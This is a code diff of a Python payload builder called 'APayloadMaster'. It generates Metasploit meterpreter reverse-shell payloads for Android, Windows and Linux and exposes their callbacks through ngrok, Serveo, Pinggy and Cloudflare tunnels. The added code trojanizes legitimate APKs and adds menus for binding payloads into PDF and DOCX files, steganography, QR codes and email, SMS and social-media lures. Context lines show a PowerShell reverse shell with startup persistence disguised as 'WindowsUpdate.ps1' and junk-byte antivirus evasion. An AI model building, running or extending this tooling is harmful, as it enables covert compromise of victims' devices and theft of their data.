@@ -21,6 +21,9 @@ import http.server
 import socketserver
 import urllib.parse
 import urllib.request
+import re
+import zipfile
+import tarfile
 
 class Colors:
     RED = '\033[91m'
@@ -39,14 +42,34 @@ class APayloadMaster:
         self.current_payload_type = None
         self.current_lhost = None
         self.current_lport = None
+        self.current_connection_type = None
         self.current_payload_name = None
         self.ngrok_process = None
         self.http_server = None
         self.db_file = "payloads.db"
+        self.pinggy_token = None
+        self.pinggy_domain = None
+        self.pinggy_server = "pro.pinggy.io"
+        
+        # Load Pinggy credentials if they exist
+        self.load_pinggy_creds()
         
         # Create directories
         self.create_directories()
         
+    def load_pinggy_creds(self):
+        """Load Pinggy credentials from config file"""
+        creds_file = "config/pinggy_creds.json"
+        if os.path.exists(creds_file):
+            try:
+                with open(creds_file, 'r') as f:
+                    creds = json.load(f)
+                    self.pinggy_token = creds.get('token', '')
+                    self.pinggy_domain = creds.get('domain', '')
+                    self.pinggy_server = creds.get('server', 'pro.pinggy.io')
+            except:
+                pass
+    
     def get_local_ip(self):
         """Get local IP address"""
         try:
@@ -69,7 +92,8 @@ class APayloadMaster:
             "server/uploads",
             "downloads",
             "logs",
-            "tools"          # for tunnel binaries
+            "tools",
+            "config"
         ]
         for d in dirs:
             os.makedirs(d, exist_ok=True)
@@ -114,20 +138,51 @@ class APayloadMaster:
             'localxpose': 'LocalXpose (optional)',
             'cloudflared': 'Cloudflare Tunnel (optional)',
             'ssh': 'SSH client (required for Serveo/Pinggy)',
-            'upx': 'UPX packer (optional)'
+            'upx': 'UPX packer (optional)',
+            'steghide': 'Steghide (optional)',
+            'zipalign': 'Zipalign (Android SDK)',
+            'apksigner': 'APK Signer'
         }
         missing = []
         for tool, name in tools.items():
-            if tool in ['ssh', 'upx']:  # usually preinstalled
+            if tool in ['ssh', 'upx', 'steghide']:
                 continue
             if shutil.which(tool) is None:
                 missing.append(name)
         return missing
     
-    # ===== TUNNEL AUTO-DOWNLOAD & AUTH =====
+    def check_apktool_version(self):
+        """Check if apktool version is >= 2.9.2 (numeric comparison)"""
+        try:
+            result = subprocess.run(["apktool", "--version"], capture_output=True, text=True)
+            if result.returncode == 0:
+                version_str = result.stdout.strip().split('\n')[0]
+                # Extract only digits and dots
+                version_str = re.sub(r'[^0-9.]', '', version_str)
+                parts = version_str.split('.')
+                if len(parts) >= 2:
+                    major = int(parts[0])
+                    minor = int(parts[1])
+                    patch = int(parts[2]) if len(parts) > 2 else 0
+                    
+                    if major > 2:
+                        return True
+                    if major == 2 and minor > 9:
+                        return True
+                    if major == 2 and minor == 9 and patch >= 2:
+                        return True
+                    
+                    print(f"{self.colors.YELLOW}[!] apktool version {version_str} is outdated. Please upgrade to 2.9.2+{self.colors.ENDC}")
+                    return False
+            return False
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Error checking apktool version: {e}{self.colors.ENDC}")
+            return False
     
-    def download_tool(self, tool_name, url, target_name=None):
-        """Download a binary tool and place it in tools/ and /usr/local/bin/"""
+    # ===== TUNNEL SETUP =====
+    
+    def download_tool(self, tool_name, url, target_name=None, archive=False):
+        """Download a binary tool and place it in tools/"""
         if shutil.which(tool_name):
             return True
         print(f"{self.colors.YELLOW}[*] Downloading {tool_name}...{self.colors.ENDC}")
@@ -136,8 +191,23 @@ class APayloadMaster:
             os.makedirs(tool_dir, exist_ok=True)
             target = os.path.join(tool_dir, target_name or tool_name)
             urllib.request.urlretrieve(url, target)
-            os.chmod(target, 0o755)
-            # Symlink to /usr/local/bin
+            if archive:
+                if target.endswith('.tgz') or target.endswith('.tar.gz'):
+                    with tarfile.open(target, 'r:gz') as tar:
+                        tar.extractall(tool_dir)
+                    extracted = os.path.join(tool_dir, tool_name)
+                    if os.path.exists(extracted):
+                        os.chmod(extracted, 0o755)
+                        target = extracted
+                elif target.endswith('.zip'):
+                    with zipfile.ZipFile(target, 'r') as zipf:
+                        zipf.extractall(tool_dir)
+                    extracted = os.path.join(tool_dir, tool_name)
+                    if os.path.exists(extracted):
+                        os.chmod(extracted, 0o755)
+                        target = extracted
+            else:
+                os.chmod(target, 0o755)
             if os.geteuid() == 0:
                 shutil.copy(target, f"/usr/local/bin/{tool_name}")
             else:
@@ -149,23 +219,14 @@ class APayloadMaster:
             return False
     
     def setup_ngrok(self, lport):
-        """Setup ngrok tunnel with auto-download and token"""
-        if not self.download_tool("ngrok", "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz"):
-            # Extract .tgz
-            with tempfile.TemporaryDirectory() as tmpdir:
-                shutil.unpack_archive("tools/ngrok.tgz", tmpdir)
-                shutil.move(os.path.join(tmpdir, "ngrok"), "tools/ngrok")
-            os.chmod("tools/ngrok", 0o755)
-        
+        if not self.download_tool("ngrok", "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz", archive=True):
+            return None, None
         token = input(f"{self.colors.YELLOW}[?] Enter ngrok auth token (optional): {self.colors.ENDC}")
         if token:
-            subprocess.run(["ngrok", "authtoken", token], capture_output=True)
-        
-        # Start ngrok
+            subprocess.run([shutil.which("ngrok") or "./tools/ngrok", "authtoken", token], capture_output=True)
         self.ngrok_process = subprocess.Popen(
-            ["ngrok", "tcp", lport],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
+            [shutil.which("ngrok") or "./tools/ngrok", "tcp", str(lport)],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
         print(f"{self.colors.GREEN}[*] Ngrok starting on port {lport}...{self.colors.ENDC}")
         time.sleep(3)
@@ -173,84 +234,138 @@ class APayloadMaster:
             import requests
             resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
             tunnels = resp.json().get("tunnels", [])
-            if tunnels:
-                for t in tunnels:
-                    if t["proto"] == "tcp":
-                        url = t["public_url"]
-                        host = url.split("//")[1].split(":")[0]
-                        port = url.split(":")[-1]
-                        return host, port
+            for t in tunnels:
+                if t["proto"] == "tcp":
+                    url = t["public_url"]
+                    host = url.split("//")[1].split(":")[0]
+                    port = url.split(":")[-1]
+                    return host, port
         except:
             pass
-        print(f"{self.colors.YELLOW}[*] Could not get ngrok URL, using 0.tcp.ngrok.io{self.colors.ENDC}")
+        print(f"{self.colors.YELLOW}[*] Could not get ngrok URL automatically. Use 0.tcp.ngrok.io or check dashboard.{self.colors.ENDC}")
         return "0.tcp.ngrok.io", lport
     
     def setup_serveo(self, lport):
-        """Serveo SSH tunnel"""
-        print(f"{self.colors.CYAN}[SERVEO]{self.colors.ENDC} Requires SSH. Use custom subdomain if desired.")
+        print(f"{self.colors.CYAN}[SERVEO]{self.colors.ENDC} Requires SSH.")
         subdomain = input(f"{self.colors.YELLOW}[?] Enter subdomain (optional): {self.colors.ENDC}")
-        cmd = ["ssh", "-R", f"{subdomain}:80:localhost:{lport}" if subdomain else f"{lport}:localhost:{lport}", "serveo.net", "-o", "StrictHostKeyChecking=no", "-f", "-N"]
-        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(2)
-        print(f"{self.colors.GREEN}[+] Serveo tunnel started{self.colors.ENDC}")
-        host = "serveo.net"
-        return host, lport
+        remote = f"{subdomain}:80:localhost:{lport}" if subdomain else f"{lport}:localhost:{lport}"
+        cmd = ["ssh", "-R", remote, "serveo.net", "-o", "StrictHostKeyChecking=no", "-f", "-N"]
+        try:
+            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(3)
+            print(f"{self.colors.GREEN}[+] Serveo tunnel started. Use: {subdomain or lport}.serveo.net{self.colors.ENDC}")
+            return "serveo.net", lport
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Serveo error: {e}{self.colors.ENDC}")
+            return None, None
     
     def setup_localxpose(self, lport):
-        """LocalXpose tunnel with auto-download and token"""
         if not self.download_tool("localxpose", "https://localxpose.io/downloads/linux/amd64", "loclx"):
             return None, None
-        token = input(f"{self.colors.YELLOW}[?] Enter LocalXpose auth token: {self.colors.ENDC}")
+        token = input(f"{self.colors.YELLOW}[?] Enter LocalXpose auth token (optional): {self.colors.ENDC}")
         if token:
-            subprocess.run(["loclx", "account", "login", "--token", token], capture_output=True)
-        # Start tunnel
+            subprocess.run([shutil.which("localxpose") or "./tools/loclx", "account", "login", "--token", token], capture_output=True)
         proc = subprocess.Popen(
-            ["loclx", "tunnel", "tcp", "--to", f"localhost:{lport}"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
+            [shutil.which("localxpose") or "./tools/loclx", "tunnel", "tcp", "--to", f"localhost:{lport}"],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
         )
         time.sleep(3)
-        # Extract URL from output (simplified)
-        print(f"{self.colors.GREEN}[+] LocalXpose tunnel started. Check logs for URL.{self.colors.ENDC}")
-        # In real usage we'd parse output, but for now ask user
-        host = input(f"{self.colors.YELLOW}[?] Enter the assigned LocalXpose host (e.g. xxx.loclx.io): {self.colors.ENDC}")
-        port = lport  # usually the same as local port for TCP tunnels
-        return host, port
+        print(f"{self.colors.GREEN}[+] LocalXpose tunnel started. Check output for URL.{self.colors.ENDC}")
+        host = input(f"{self.colors.YELLOW}[?] Enter the assigned LocalXpose host (or press Enter to skip): {self.colors.ENDC}")
+        if host:
+            return host, lport
+        else:
+            return None, None
     
     def setup_pinggy(self, lport):
-        """Pinggy SSH tunnel"""
-        print(f"{self.colors.CYAN}[PINGGY]{self.colors.ENDC} Pinggy uses SSH.")
-        subdomain = input(f"{self.colors.YELLOW}[?] Enter subdomain (optional): {self.colors.ENDC}")
-        ssh_command = f"ssh -p 443 -R0:localhost:{lport} -o StrictHostKeyChecking=no {'-l ' + subdomain if subdomain else ''} qr@pinggy.io"
-        subprocess.Popen(ssh_command.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(3)
-        print(f"{self.colors.GREEN}[+] Pinggy tunnel started. Get URL from pinggy.io dashboard.{self.colors.ENDC}")
-        host = input(f"{self.colors.YELLOW}[?] Enter the Pinggy host (e.g. xyz.pinggy.io): {self.colors.ENDC}")
-        port = lport
-        return host, port
+        """Pinggy tunnel setup – with option to use existing tunnel"""
+        print(f"{self.colors.CYAN}[PINGGY]{self.colors.ENDC} SSH tunnel.")
+        print("\n1. Start a new Pinggy tunnel (using your token)")
+        print("2. I already have a Pinggy tunnel running – enter LHOST/LPORT manually")
+        choice = input(f"{self.colors.YELLOW}[?] Select option (1 or 2): {self.colors.ENDC}")
+        
+        if choice == "2":
+            lhost = input(f"{self.colors.YELLOW}[?] Enter your Pinggy public host (e.g., mahicyberaware.pinggy.link): {self.colors.ENDC}")
+            lport = input(f"{self.colors.YELLOW}[?] Enter your Pinggy public port (default: {lport}): {self.colors.ENDC}") or lport
+            return lhost, lport
+        
+        # Option 1: start new tunnel
+        if not self.pinggy_token:
+            print(f"{self.colors.YELLOW}[*] No Pinggy Pro token found. Using free mode.{self.colors.ENDC}")
+            use_pro = False
+        else:
+            print(f"{self.colors.GREEN}[*] Pinggy Pro token detected.{self.colors.ENDC}")
+            use_pro = input(f"{self.colors.YELLOW}[?] Use Pro account? (y/n, default y): {self.colors.ENDC}").lower() != 'n'
+        
+        if use_pro:
+            # Build the exact command from screenshot
+            ssh_cmd = [
+                "ssh", "-p", "443",
+                "-R", f"0:localhost:{lport}",
+                "-o", "StrictHostKeyChecking=no",
+                "-o", "ServerAliveInterval=30",
+                f"{self.pinggy_token}+force+tcp@{self.pinggy_server}"
+            ]
+            public_host = self.pinggy_domain.replace('.a.pinggy.link', '.pinggy.link') if self.pinggy_domain else f"{self.pinggy_token[:8]}.pinggy.link"
+        else:
+            # Free mode
+            subdomain = input(f"{self.colors.YELLOW}[?] Enter custom subdomain (optional): {self.colors.ENDC}")
+            if subdomain:
+                ssh_cmd = [
+                    "ssh", "-p", "443",
+                    "-R", f"{subdomain}:80:localhost:{lport}",
+                    "-o", "StrictHostKeyChecking=no",
+                    "pinggy.io"
+                ]
+                public_host = f"{subdomain}.pinggy.io"
+            else:
+                ssh_cmd = [
+                    "ssh", "-p", "443",
+                    "-R", f"0:localhost:{lport}",
+                    "-o", "StrictHostKeyChecking=no",
+                    "pinggy.io", "tcp"
+                ]
+                public_host = "live.pinggy.io"
+        
+        # Display masked command
+        masked = " ".join(ssh_cmd[:6]) + " ****@..." if use_pro else " ".join(ssh_cmd)
+        print(f"{self.colors.CYAN}[*] Starting tunnel: {masked}{self.colors.ENDC}")
+        
+        # Add -f to background
+        ssh_cmd.insert(1, "-f")
+        try:
+            subprocess.Popen(ssh_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(3)
+            print(f"{self.colors.GREEN}[+] Pinggy tunnel started.{self.colors.ENDC}")
+            print(f"{self.colors.GREEN}[+] Use for payload: LHOST={public_host}, LPORT={lport}{self.colors.ENDC}")
+            return public_host, lport
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Pinggy error: {e}{self.colors.ENDC}")
+            return None, None
     
     def setup_cloudflare(self, lport):
-        """Cloudflare Tunnel (cloudflared)"""
         if not self.download_tool("cloudflared", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared"):
             return None, None
-        token = input(f"{self.colors.YELLOW}[?] Enter Cloudflare Tunnel token (from Zero Trust dashboard): {self.colors.ENDC}")
-        if token:
-            # Run tunnel with token
-            subprocess.Popen(["cloudflared", "tunnel", "--no-autoupdate", "run", "--token", token],
-                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            print(f"{self.colors.GREEN}[+] Cloudflare tunnel started with token{self.colors.ENDC}")
-            # Cloudflare assigns a URL, we need to ask user or fetch via API
-            host = input(f"{self.colors.YELLOW}[?] Enter your Cloudflare tunnel hostname: {self.colors.ENDC}")
-            port = "443"  # HTTPS
-            return host, port
+        token = input(f"{self.colors.YELLOW}[?] Enter Cloudflare Tunnel token: {self.colors.ENDC}")
+        if not token:
+            print(f"{self.colors.RED}[!] Token required{self.colors.ENDC}")
+            return None, None
+        proc = subprocess.Popen(
+            [shutil.which("cloudflared") or "./tools/cloudflared", "tunnel", "--no-autoupdate", "run", "--token", token],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+        time.sleep(5)
+        print(f"{self.colors.GREEN}[+] Cloudflare tunnel started.{self.colors.ENDC}")
+        host = input(f"{self.colors.YELLOW}[?] Enter your Cloudflare tunnel hostname (e.g., https://xyz.trycloudflare.com): {self.colors.ENDC}")
+        if host:
+            host = host.replace("https://", "").replace("http://", "").split("/")[0]
+            return host, "443"
         else:
-            print(f"{self.colors.RED}[!] Token required for Cloudflare tunnel{self.colors.ENDC}")
             return None, None
     
     # ===== PAYLOAD CREATION =====
     
     def create_payload_menu(self):
-        """Main payload creation menu"""
         while True:
             print(f"\n{self.colors.GREEN}[PAYLOAD CREATION]{self.colors.ENDC}")
             print("="*50)
@@ -270,18 +385,21 @@ class APayloadMaster:
             
             lport = input(f"{self.colors.YELLOW}[?] Enter LPORT (default: 4444): {self.colors.ENDC}") or "4444"
             lhost = None
+            conn_type = None
             
             if choice == "1":
                 lhost = self.local_ip
+                conn_type = "localhost"
                 print(f"{self.colors.GREEN}[+] Using local IP: {lhost}{self.colors.ENDC}")
-                self.payload_type_menu(lhost, lport, "localhost")
+                self.payload_type_menu(lhost, lport, conn_type)
             elif choice == "2":
                 host, port = self.setup_ngrok(lport)
                 if host:
                     self.payload_type_menu(host, port, "ngrok")
             elif choice == "3":
                 host, port = self.setup_serveo(lport)
-                self.payload_type_menu(host, port, "serveo")
+                if host:
+                    self.payload_type_menu(host, port, "serveo")
             elif choice == "4":
                 host, port = self.setup_localxpose(lport)
                 if host:
@@ -296,10 +414,10 @@ class APayloadMaster:
                     self.payload_type_menu(host, port, "cloudflare")
             elif choice == "7":
                 lhost = input(f"{self.colors.YELLOW}[?] Enter custom LHOST: {self.colors.ENDC}")
-                self.payload_type_menu(lhost, lport, "custom")
+                conn_type = "custom"
+                self.payload_type_menu(lhost, lport, conn_type)
     
     def payload_type_menu(self, lhost, lport, connection_type):
-        """Select payload type"""
         print(f"\n{self.colors.CYAN}[PAYLOAD TYPE]{self.colors.ENDC}")
         print(f"Connection: {connection_type} | LHOST: {lhost} | LPORT: {lport}")
         print("-"*50)
@@ -316,21 +434,17 @@ class APayloadMaster:
         if choice == "8":
             return
         
-        # Store current settings for listener
         self.current_lhost = lhost
         self.current_lport = lport
         self.current_connection_type = connection_type
         
-        # Custom output filename
         custom_name = input(f"{self.colors.YELLOW}[?] Enter output filename (leave blank for auto): {self.colors.ENDC}")
-        
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         if custom_name:
             base_name = custom_name
         else:
             base_name = f"{self.get_payload_prefix(choice)}_{timestamp}"
         
-        # Advanced options
         print(f"\n{self.colors.CYAN}[ADVANCED OPTIONS]{self.colors.ENDC}")
         encrypt = input(f"{self.colors.YELLOW}[?] Encrypt payload? (y/n): {self.colors.ENDC}").lower() == 'y'
         obfuscate = input(f"{self.colors.YELLOW}[?] Obfuscate payload? (y/n): {self.colors.ENDC}").lower() == 'y'
@@ -364,19 +478,12 @@ class APayloadMaster:
             self.current_payload = payload_file
             self.current_payload_name = os.path.basename(payload_file)
             print(f"{self.colors.GREEN}[+] Payload created: {payload_file}{self.colors.ENDC}")
-            
-            # Calculate hash
             file_hash = self.calculate_hash(payload_file)
             print(f"{self.colors.CYAN}[*] SHA256: {file_hash}{self.colors.ENDC}")
-            
-            # Ask about listener
             self.ask_start_listener()
-            
-            # Ask about distribution
-            self.distribution_menu(payload_file)
+            self.binding_menu()
     
     def get_payload_prefix(self, choice):
-        """Return payload prefix based on choice"""
         prefixes = {
             "1": "android",
             "2": "windows",
@@ -388,21 +495,51 @@ class APayloadMaster:
         }
         return prefixes.get(choice, "payload")
     
+    def resolve_host(self, hostname):
+        """Try to resolve hostname to IP; return IP if success, else original hostname"""
+        try:
+            ip = socket.gethostbyname(hostname)
+            print(f"{self.colors.GREEN}[+] Resolved {hostname} -> {ip}{self.colors.ENDC}")
+            return ip
+        except socket.gaierror:
+            print(f"{self.colors.YELLOW}[!] Could not resolve {hostname}, using as-is (may cause issues){self.colors.ENDC}")
+            return hostname
+    
     def create_android_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
-        """Create Android APK with auto-permissions"""
         output_file = f"output/payloads/{base_name}.apk"
         print(f"{self.colors.CYAN}[*] Creating Android payload...{self.colors.ENDC}")
+        
+        # Try to resolve hostname to IP (msfvenom works better with IP)
+        lhost_for_msf = self.resolve_host(lhost)
         
         try:
             cmd = [
                 "msfvenom", "-p", "android/meterpreter/reverse_tcp",
-                f"LHOST={lhost}", f"LPORT={lport}",
+                f"LHOST={lhost_for_msf}", f"LPORT={lport}",
                 "-o", output_file
             ]
-            result = subprocess.run(cmd, capture_output=True, text=True)
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
             if result.returncode != 0:
-                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
-                return None
+                print(f"{self.colors.RED}[!] msfvenom error:{self.colors.ENDC}")
+                print(result.stderr)
+                # If resolution failed, ask user to enter IP manually
+                if lhost_for_msf == lhost and not re.match(r'^\d+\.\d+\.\d+\.\d+$', lhost):
+                    print(f"{self.colors.YELLOW}[*] The LHOST might need to be an IP address.{self.colors.ENDC}")
+                    manual_ip = input(f"{self.colors.YELLOW}[?] Enter an IP address manually (or press Enter to abort): {self.colors.ENDC}")
+                    if manual_ip and re.match(r'^\d+\.\d+\.\d+\.\d+$', manual_ip):
+                        cmd = [
+                            "msfvenom", "-p", "android/meterpreter/reverse_tcp",
+                            f"LHOST={manual_ip}", f"LPORT={lport}",
+                            "-o", output_file
+                        ]
+                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+                        if result.returncode != 0:
+                            print(f"{self.colors.RED}[!] Still failed: {result.stderr}{self.colors.ENDC}")
+                            return None
+                    else:
+                        return None
+                else:
+                    return None
             
             self.enhance_android_apk(output_file)
             
@@ -420,10 +557,11 @@ class APayloadMaster:
     def create_windows_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
         output_file = f"output/payloads/{base_name}.exe"
         print(f"{self.colors.CYAN}[*] Creating Windows payload...{self.colors.ENDC}")
+        lhost_for_msf = self.resolve_host(lhost)
         try:
             cmd = [
                 "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
-                f"LHOST={lhost}", f"LPORT={lport}",
+                f"LHOST={lhost_for_msf}", f"LPORT={lport}",
                 "-f", "exe", "-o", output_file
             ]
             result = subprocess.run(cmd, capture_output=True, text=True)
@@ -442,10 +580,11 @@ class APayloadMaster:
     def create_windows_dll_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
         output_file = f"output/payloads/{base_name}.dll"
         print(f"{self.colors.CYAN}[*] Creating Windows DLL payload...{self.colors.ENDC}")
+        lhost_for_msf = self.resolve_host(lhost)
         try:
             cmd = [
                 "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
-                f"LHOST={lhost}", f"LPORT={lport}",
+                f"LHOST={lhost_for_msf}", f"LPORT={lport}",
                 "-f", "dll", "-o", output_file
             ]
             result = subprocess.run(cmd, capture_output=True, text=True)
@@ -464,13 +603,13 @@ class APayloadMaster:
     def create_linux_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
         output_file = f"output/payloads/{base_name}.elf"
         print(f"{self.colors.CYAN}[*] Creating Linux payload...{self.colors.ENDC}")
+        lhost_for_msf = self.resolve_host(lhost)
         try:
-            # Detect architecture (simple: assume x64 if system is 64-bit, else x86)
             arch = "x64" if sys.maxsize > 2**32 else "x86"
             payload = f"linux/{arch}/meterpreter/reverse_tcp"
             cmd = [
                 "msfvenom", "-p", payload,
-                f"LHOST={lhost}", f"LPORT={lport}",
+                f"LHOST={lhost_for_msf}", f"LPORT={lport}",
                 "-f", "elf", "-o", output_file
             ]
             result = subprocess.run(cmd, capture_output=True, text=True)
@@ -575,7 +714,6 @@ function Reverse-Shell {{
         }} catch {{ Start-Sleep -Seconds 10 }}
     }}
 }}
-# Add persistence
 $persistencePath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1"
 if (Test-Path $persistencePath) {{
     Copy-Item $MyInvocation.MyCommand.Path -Destination $persistencePath -Force
@@ -620,7 +758,6 @@ reverse_shell
         return output_file
     
     def enhance_android_apk(self, apk_path):
-        """Add auto-permissions and auto-start to Android APK"""
         try:
             script = f"""#!/bin/bash
 echo "[*] Adding auto-permissions to APK..."
@@ -720,7 +857,6 @@ exec(base64.b64decode("{encoded}").decode())
                     return packed_file
             except:
                 pass
-        # Add junk bytes
         with open(filepath, 'ab') as f:
             f.write(os.urandom(1024))
         print(f"{self.colors.GREEN}[+] Added junk bytes for AV evasion{self.colors.ENDC}")
@@ -734,7 +870,6 @@ exec(base64.b64decode("{encoded}").decode())
         return sha256.hexdigest()
     
     def get_msf_payload(self, payload_type):
-        """Return appropriate Metasploit payload string for the given type"""
         mapping = {
             "android": "android/meterpreter/reverse_tcp",
             "windows": "windows/meterpreter/reverse_tcp",
@@ -747,25 +882,25 @@ exec(base64.b64decode("{encoded}").decode())
         return mapping.get(payload_type, "windows/meterpreter/reverse_tcp")
     
     def ask_start_listener(self):
-        """Ask to start Metasploit listener with correct payload"""
         if not self.current_payload_type:
             print(f"{self.colors.RED}[!] No payload type set{self.colors.ENDC}")
             return
+        if self.current_connection_type in ["ngrok", "pinggy", "serveo", "localxpose", "cloudflare"]:
+            listener_host = "0.0.0.0"
+            print(f"{self.colors.YELLOW}[*] Tunnel detected: listener will bind to {listener_host}{self.colors.ENDC}")
+        else:
+            listener_host = self.current_lhost
         choice = input(f"\n{self.colors.YELLOW}[?] Start Metasploit listener? (y/n): {self.colors.ENDC}")
         if choice.lower() == 'y':
-            self.start_metasploit_listener()
+            self.start_metasploit_listener(listener_host, self.current_lport, self.current_payload_type)
     
-    def start_metasploit_listener(self):
-        """Start Metasploit multi/handler with payload matching current payload type"""
-        if not self.current_lhost or not self.current_lport or not self.current_payload_type:
-            print(f"{self.colors.RED}[!] Missing listener parameters{self.colors.ENDC}")
-            return
-        payload = self.get_msf_payload(self.current_payload_type)
-        rc_file = f"listener_{self.current_lport}.rc"
+    def start_metasploit_listener(self, lhost, lport, payload_type):
+        payload = self.get_msf_payload(payload_type)
+        rc_file = f"listener_{lport}.rc"
         rc_content = f"""use exploit/multi/handler
 set PAYLOAD {payload}
-set LHOST {self.current_lhost}
-set LPORT {self.current_lport}
+set LHOST {lhost}
+set LPORT {lport}
 set ExitOnSession false
 exploit -j
 """
@@ -773,7 +908,6 @@ exploit -j
             f.write(rc_content)
         print(f"{self.colors.CYAN}[*] Starting Metasploit listener ({payload})...{self.colors.ENDC}")
         print(f"{self.colors.CYAN}[*] Command: msfconsole -r {rc_file}{self.colors.ENDC}")
-        
         def run_listener():
             subprocess.run(["msfconsole", "-r", rc_file])
         thread = threading.Thread(target=run_listener)
@@ -782,66 +916,418 @@ exploit -j
         print(f"{self.colors.GREEN}[+] Listener started in background{self.colors.ENDC}")
         print(f"{self.colors.YELLOW}[*] Check sessions with: sessions -l{self.colors.ENDC}")
     
-    # ===== BINDING/HIDING (unchanged, but we keep them) =====
+    # ===== BINDING/HIDING =====
+    
     def binding_menu(self):
-        # ... (same as original, omitted for brevity)
-        pass
+        if not self.current_payload:
+            print(f"{self.colors.RED}[!] No payload selected. Generate a payload first.{self.colors.ENDC}")
+            return
+        
+        while True:
+            print(f"\n{self.colors.GREEN}[BINDING & HIDING]{self.colors.ENDC}")
+            print("="*50)
+            print(f"Current payload: {self.current_payload_name}")
+            print("1. Bind with APK file")
+            print("2. Bind with PDF file")
+            print("3. Bind with DOCX file")
+            print("4. Hide in image (steganography)")
+            print("5. Generate QR code for download")
+            print("6. Create Windows shortcut")
+            print("7. Create Android launcher icon")
+            print("8. Generate email template")
+            print("9. Generate SMS template")
+            print("10. Generate social media message")
+            print("11. Create download link (HTTP server)")
+            print("12. Decrypt encrypted APK")
+            print("13. Back")
+            
+            choice = input(f"\n{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
+            if choice == "13":
+                return
+            elif choice == "1":
+                self.bind_with_apk()
+            elif choice == "2":
+                self.bind_with_pdf()
+            elif choice == "3":
+                self.bind_with_docx()
+            elif choice == "4":
+                self.hide_in_image_menu()
+            elif choice == "5":
+                self.generate_qr_code(self.current_payload)
+            elif choice == "6":
+                self.create_windows_shortcut(self.current_payload)
+            elif choice == "7":
+                self.create_android_launcher(self.current_payload)
+            elif choice == "8":
+                self.generate_email_template(self.current_payload)
+            elif choice == "9":
+                self.generate_sms_template(self.current_payload)
+            elif choice == "10":
+                self.generate_social_media_message(self.current_payload)
+            elif choice == "11":
+                self.create_download_link(self.current_payload)
+            elif choice == "12":
+                self.decrypt_apk_menu()
     
-    def generate_qr_code(self, filepath):
-        # ... (same as original)
-        pass
+    def bind_with_apk(self):
+        if not self.current_lhost or not self.current_lport:
+            print(f"{self.colors.RED}[!] No LHOST/LPORT from payload. Please set them manually.{self.colors.ENDC}")
+            self.current_lhost = input("LHOST: ")
+            self.current_lport = input("LPORT: ")
+        
+        # Check for zipalign
+        if not shutil.which("zipalign"):
+            print(f"{self.colors.RED}[!] zipalign not found. Please install Android SDK build-tools.{self.colors.ENDC}")
+            print(f"{self.colors.YELLOW}[*] On Kali: sudo apt install android-sdk-build-tools{self.colors.ENDC}")
+            print(f"{self.colors.YELLOW}[*] On Termux: pkg install android-tools{self.colors.ENDC}")
+            proceed = input(f"{self.colors.YELLOW}[?] Attempt anyway? (y/n): {self.colors.ENDC}")
+            if proceed.lower() != 'y':
+                return
+        
+        # Check apktool version
+        if not self.check_apktool_version():
+            print(f"{self.colors.RED}[!] Binding requires apktool >= 2.9.2.{self.colors.ENDC}")
+            print(f"{self.colors.YELLOW}[*] To upgrade on Kali: sudo apt update && sudo apt install apktool{self.colors.ENDC}")
+            print(f"{self.colors.YELLOW}[*] Or download latest from https://ibotpeaches.github.io/Apktool/){self.colors.ENDC}")
+            proceed = input(f"{self.colors.YELLOW}[?] Attempt anyway? (y/n): {self.colors.ENDC}")
+            if proceed.lower() != 'y':
+                return
+        
+        apk_path = input(f"{self.colors.YELLOW}[?] Enter path to original APK file: {self.colors.ENDC}")
+        if not os.path.exists(apk_path):
+            print(f"{self.colors.RED}[!] APK file not found{self.colors.ENDC}")
+            return
+        
+        output_name = input(f"{self.colors.YELLOW}[?] Enter output APK name (default: bound_apk.apk): {self.colors.ENDC}") or "bound_apk.apk"
+        output_path = f"output/bound/{output_name}"
+        
+        print(f"{self.colors.CYAN}[*] Binding payload with APK...{self.colors.ENDC}")
+        
+        # Resolve host to IP for msfvenom
+        lhost_for_msf = self.resolve_host(self.current_lhost)
+        
+        try:
+            cmd = [
+                "msfvenom", "-x", apk_path,
+                "-p", "android/meterpreter/reverse_tcp",
+                f"LHOST={lhost_for_msf}", f"LPORT={self.current_lport}",
+                "-o", output_path
+            ]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
+            if result.returncode == 0:
+                print(f"{self.colors.GREEN}[+] Bound APK created: {output_path}{self.colors.ENDC}")
+            else:
+                print(f"{self.colors.RED}[!] msfvenom error:{self.colors.ENDC}")
+                print(result.stderr)
+                # If apksigner missing, try with jarsigner using debug keystore
+                if "apksigner not found" in result.stderr:
+                    print(f"{self.colors.YELLOW}[*] apksigner not found, trying with jarsigner...{self.colors.ENDC}")
